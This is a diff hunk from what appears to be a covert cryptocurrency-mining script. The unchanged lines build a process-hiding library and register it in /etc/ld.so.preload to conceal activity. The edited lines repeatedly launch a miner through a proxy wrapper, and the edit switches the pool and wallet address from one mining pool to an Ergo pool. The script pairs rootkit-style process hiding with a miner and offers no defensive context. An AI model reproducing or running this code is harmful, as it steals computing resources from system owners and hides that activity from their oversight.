@@ -43,18 +43,18 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX 
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX 
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://annora.$(echo $(shuf -i 1-99999 -n 1)-T4)@etc.poolbinance.com:443 --ocX 
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo $(shuf -i 1-99999 -n 1)-T4)@de.ergo.herominers.com:1180 --ocX 
